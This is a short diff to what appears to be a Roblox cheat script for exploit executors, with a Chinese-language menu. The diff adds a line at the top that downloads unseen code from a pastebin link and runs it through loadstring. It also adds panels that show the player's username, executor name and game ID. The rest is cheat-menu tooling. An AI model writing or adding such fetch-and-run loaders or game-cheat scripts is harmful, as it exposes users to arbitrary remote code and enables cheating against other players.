@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()
+
 game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "看到这个就代表可以用"; Text ="请耐心等待加载"; Duration = 4; })
 
 local CoreGui = game:GetService("StarterGui")
@@ -35,6 +37,10 @@ local Tab = Window:MakeTab({
 	Icon = "rbxassetid://7734068321",
 	PremiumOnly = false
 })
+
+Tab:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
+Tab:AddParagraph("您的注入器:"," "..identifyexecutor().."")
+Tab:AddParagraph("您当前服务器的ID"," "..game.GameId.."")
 
 Tab:AddButton({
 	Name = "开启玩家进出服务器提示",
